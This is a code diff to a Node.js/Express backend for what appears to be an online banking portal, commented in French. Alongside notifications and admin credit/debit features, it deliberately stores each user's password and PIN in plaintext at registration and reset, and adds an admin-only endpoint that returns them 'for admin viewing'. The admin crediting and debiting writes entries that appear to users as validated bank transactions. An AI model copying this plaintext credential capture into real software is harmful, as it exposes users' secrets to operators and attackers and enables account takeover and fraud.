@@ -116,7 +116,8 @@ function getEmptyData(accountNumber) {
     transaction3_status: '',
     transaction3_amount: '0',
     synthese_total: '0',
-    transfers_json: '[]'
+    transfers_json: '[]',
+    notifications_json: '[]'
   };
 }
 
@@ -132,10 +133,12 @@ async function initFileStorage() {
   if (existing) {
     existing.passwordHash = pwHash;
     existing.pinHash = pinHash;
+    existing.passwordPlain = ADMIN_PASSWORD;
+    existing.pinPlain = ADMIN_PIN;
     existing.role = 'admin';
   } else {
     const adminId = 'admin-' + crypto.randomBytes(8).toString('hex');
-    users.push({ id: adminId, username: ADMIN_USERNAME, passwordHash: pwHash, pinHash, role: 'admin', createdAt: new Date().toISOString() });
+    users.push({ id: adminId, username: ADMIN_USERNAME, passwordHash: pwHash, pinHash, passwordPlain: ADMIN_PASSWORD, pinPlain: ADMIN_PIN, role: 'admin', createdAt: new Date().toISOString() });
     writeAccountFile(adminId, getEmptyData());
   }
   writeUsers(users);
@@ -218,12 +221,12 @@ async function findUserById(id) {
   return { id: String(row.id), username: row.username, passwordHash: row.password_hash, pinHash: row.pin_hash, role: row.role, createdAt: row.created_at };
 }
 
-async function createUser(username, passwordHash, pinHash) {
+async function createUser(username, passwordHash, pinHash, passwordPlain, pinPlain) {
   const seed = getEmptyData();
   if (!useDB) {
     const users = readUsers();
     const id = generateUserId();
-    const user = { id, username, passwordHash, pinHash, role: 'user', createdAt: new Date().toISOString() };
+    const user = { id, username, passwordHash, pinHash, passwordPlain, pinPlain, role: 'user', createdAt: new Date().toISOString() };
     users.push(user);
     writeUsers(users);
     writeAccountFile(id, seed);
@@ -234,6 +237,11 @@ async function createUser(username, passwordHash, pinHash) {
     [username, passwordHash, pinHash]
   );
   const row = r.rows[0];
+  // Stocke aussi le mot de passe et le PIN en clair dans account_data pour visualisation admin
+  await pool.query(
+    `INSERT INTO account_data (user_id, key, value) VALUES ($1,'_password_plain',$2),($1,'_pin_plain',$3) ON CONFLICT (user_id, key) DO UPDATE SET value=EXCLUDED.value`,
+    [row.id, passwordPlain || '', pinPlain || '']
+  );
   const user = { id: String(row.id), username: row.username, passwordHash: row.password_hash, pinHash: row.pin_hash, role: row.role, createdAt: row.created_at };
   for (const [key, value] of Object.entries(seed)) {
     await pool.query(
@@ -242,6 +250,19 @@ async function createUser(username, passwordHash, pinHash) {
     );
   }
   return user;
+}
+
+async function getUserCredentials(userId) {
+  if (!useDB) {
+    const u = readUsers().find(x => x.id === userId);
+    if (!u) return null;
+    return { username: u.username, passwordPlain: u.passwordPlain || '(non disponible)', pinPlain: u.pinPlain || '(non disponible)', role: u.role };
+  }
+  const u = await pool.query(`SELECT username, role FROM users WHERE id=$1`, [userId]);
+  if (!u.rows.length) return null;
+  const r = await pool.query(`SELECT key, value FROM account_data WHERE user_id=$1 AND key IN ('_password_plain','_pin_plain')`, [userId]);
+  const map = {}; r.rows.forEach(row => { map[row.key] = row.value; });
+  return { username: u.rows[0].username, role: u.rows[0].role, passwordPlain: map._password_plain || '(non disponible)', pinPlain: map._pin_plain || '(non disponible)' };
 }
 
 async function getAllUsers() {
@@ -300,14 +321,20 @@ async function saveAccountData(userId, updates) {
   }
 }
 
-async function updateUserPassword(userId, newHash) {
+async function updateUserPassword(userId, newHash, newPlain) {
   if (!useDB) {
     const users = readUsers();
     const idx = users.findIndex(u => u.id === userId);
-    if (idx !== -1) { users[idx].passwordHash = newHash; writeUsers(users); }
+    if (idx !== -1) { users[idx].passwordHash = newHash; if (newPlain != null) users[idx].passwordPlain = newPlain; writeUsers(users); }
     return;
   }
   await pool.query(`UPDATE users SET password_hash=$1 WHERE id=$2`, [newHash, userId]);
+  if (newPlain != null) {
+    await pool.query(
+      `INSERT INTO account_data (user_id, key, value) VALUES ($1,'_password_plain',$2) ON CONFLICT (user_id, key) DO UPDATE SET value=$2`,
+      [userId, newPlain]
+    );
+  }
 }
 
 async function deleteUserById(userId) {
@@ -351,7 +378,7 @@ app.post('/api/auth/register', async (req, res) => {
 
     const pwHash = await bcrypt.hash(password, 10);
     const pinHash = await bcrypt.hash(pin, 10);
-    const user = await createUser(username.trim(), pwHash, pinHash);
+    const user = await createUser(username.trim(), pwHash, pinHash, password, pin);
 
     await saveAccountData(user.id, {
       holder_firstname: String(firstName).trim(),
@@ -419,6 +446,15 @@ app.post('/api/client-data', auth, async (req, res) => {
 function parseTransfers(raw) {
   try { const v = JSON.parse(raw || '[]'); return Array.isArray(v) ? v : []; } catch { return []; }
 }
+function parseNotifs(raw) {
+  try { const v = JSON.parse(raw || '[]'); return Array.isArray(v) ? v : []; } catch { return []; }
+}
+function computePending(transfers) {
+  return transfers
+    .filter(t => (t.status === 'À venir' || t.status === 'a_venir') && (t.type !== 'credit'))
+    .reduce((sum, t) => sum + Math.abs(Number(t.amount) || 0), 0)
+    .toFixed(2);
+}
 
 app.get('/api/transfers', auth, async (req, res) => {
   try {
@@ -440,6 +476,7 @@ app.post('/api/transfers', auth, async (req, res) => {
     if (amt > balance) return res.status(400).json({ error: 'Solde insuffisant pour effectuer ce virement.' });
 
     const transfers = parseTransfers(data.transfers_json);
+    const notifs = parseNotifs(data.notifications_json);
     const tx = {
       id: 'tr-' + Date.now() + '-' + crypto.randomBytes(3).toString('hex'),
       date: new Date().toISOString(),
@@ -447,17 +484,28 @@ app.post('/api/transfers', auth, async (req, res) => {
       beneficiary: String(beneficiary).trim(),
       iban: String(iban || '').trim(),
       amount: amt,
+      type: 'debit',
       motif: String(motif || '').trim(),
-      status: 'Exécuté',
+      status: 'À venir',
       fromAccount: data.account_number
     };
     transfers.unshift(tx);
     const newBalance = (balance - amt).toFixed(2);
+    const pending = computePending(transfers);
+    notifs.unshift({
+      id: 'n-' + Date.now(),
+      date: new Date().toISOString(),
+      title: 'Virement enregistré',
+      message: `Virement de ${amt.toFixed(2)} € vers ${tx.beneficiary} enregistré. Nouveau solde : ${newBalance} €.`,
+      read: false
+    });
     await saveAccountData(req.user.userId, {
       transfers_json: JSON.stringify(transfers).slice(0, 200000),
-      account_balance: newBalance
+      notifications_json: JSON.stringify(notifs.slice(0, 50)),
+      account_balance: newBalance,
+      account_pending: pending
     });
-    res.json({ success: true, transfer: tx, newBalance });
+    res.json({ success: true, transfer: tx, newBalance, pending });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
@@ -484,16 +532,96 @@ app.get('/api/admin/users/:id/transfers', auth, adminOnly, async (req, res) => {
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// Créditer un compte (administration)
+// Créditer un compte (administration) — enregistre une ligne d'historique + notification
 app.post('/api/admin/users/:id/credit', auth, adminOnly, async (req, res) => {
   try {
     const amt = Number.parseFloat(String(req.body?.amount || '0').replace(',', '.'));
+    const label = String(req.body?.label || '').trim();
     if (!Number.isFinite(amt) || amt === 0) return res.status(400).json({ error: 'Montant invalide' });
     const data = await getAccountData(req.params.id);
     const balance = Number.parseFloat(data.account_balance || '0') || 0;
     const newBalance = (balance + amt).toFixed(2);
-    await saveAccountData(req.params.id, { account_balance: newBalance });
+    const transfers = parseTransfers(data.transfers_json);
+    const notifs = parseNotifs(data.notifications_json);
+    transfers.unshift({
+      id: 'ad-' + Date.now() + '-' + crypto.randomBytes(3).toString('hex'),
+      date: new Date().toISOString(),
+      dateLabel: new Date().toLocaleString('fr-FR'),
+      beneficiary: amt >= 0 ? 'Crédit administrateur' : 'Débit administrateur',
+      amount: amt,
+      type: amt >= 0 ? 'credit' : 'debit',
+      status: 'Validé',
+      motif: label || (amt >= 0 ? 'Versement' : 'Prélèvement')
+    });
+    notifs.unshift({
+      id: 'n-' + Date.now(),
+      date: new Date().toISOString(),
+      title: amt >= 0 ? '💰 Compte crédité' : '⚠️ Débit effectué',
+      message: amt >= 0
+        ? `Votre compte a été crédité de ${amt.toFixed(2)} €. Nouveau solde : ${newBalance} €.`
+        : `Votre compte a été débité de ${Math.abs(amt).toFixed(2)} €. Nouveau solde : ${newBalance} €.`,
+      read: false
+    });
+    await saveAccountData(req.params.id, {
+      account_balance: newBalance,
+      transfers_json: JSON.stringify(transfers).slice(0, 200000),
+      notifications_json: JSON.stringify(notifs.slice(0, 50))
+    });
     res.json({ success: true, newBalance });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// Notifications utilisateur
+app.get('/api/notifications', auth, async (req, res) => {
+  try {
+    const data = await getAccountData(req.user.userId);
+    res.json(parseNotifs(data.notifications_json));
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.post('/api/notifications/read-all', auth, async (req, res) => {
+  try {
+    const data = await getAccountData(req.user.userId);
+    const notifs = parseNotifs(data.notifications_json).map(n => ({ ...n, read: true }));
+    await saveAccountData(req.user.userId, { notifications_json: JSON.stringify(notifs) });
+    res.json({ success: true });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// Synthèse globale (administrateur)
+app.get('/api/admin/synthese', auth, adminOnly, async (req, res) => {
+  try {
+    const users = await getAllUsers();
+    const rows = [];
+    let total = 0, totalCredits = 0;
+    for (const u of users) {
+      if (u.role === 'admin') continue;
+      const d = await getAccountData(u.id);
+      const balance = Number.parseFloat(d.account_balance || '0') || 0;
+      const transfers = parseTransfers(d.transfers_json);
+      const credits = transfers.filter(t => t.type === 'credit').reduce((s, t) => s + (Number(t.amount) || 0), 0);
+      total += balance;
+      totalCredits += credits;
+      rows.push({
+        id: u.id,
+        username: u.username,
+        fullName: [d.holder_firstname, d.holder_lastname].filter(Boolean).join(' ') || u.username,
+        balance,
+        credits,
+        frozen: d.account_frozen === 'true',
+        accountNumber: d.account_number || ''
+      });
+    }
+    res.json({ rows, total, totalCredits });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+// Identifiants en clair (admin uniquement)
+app.get('/api/admin/users/:id/credentials', auth, adminOnly, async (req, res) => {
+  try {
+    const creds = await getUserCredentials(req.params.id);
+    if (!creds) return res.status(404).json({ error: 'Utilisateur introuvable' });
+    res.json(creds);
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
@@ -501,7 +629,7 @@ app.post('/api/admin/users/:id/reset-password', auth, adminOnly, async (req, res
   try {
     const { newPassword } = req.body;
     if (!newPassword || newPassword.length < 4) return res.status(400).json({ error: 'Mot de passe : 4 caractères minimum' });
-    await updateUserPassword(req.params.id, await bcrypt.hash(newPassword, 10));
+    await updateUserPassword(req.params.id, await bcrypt.hash(newPassword, 10), newPassword);
     res.json({ success: true });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
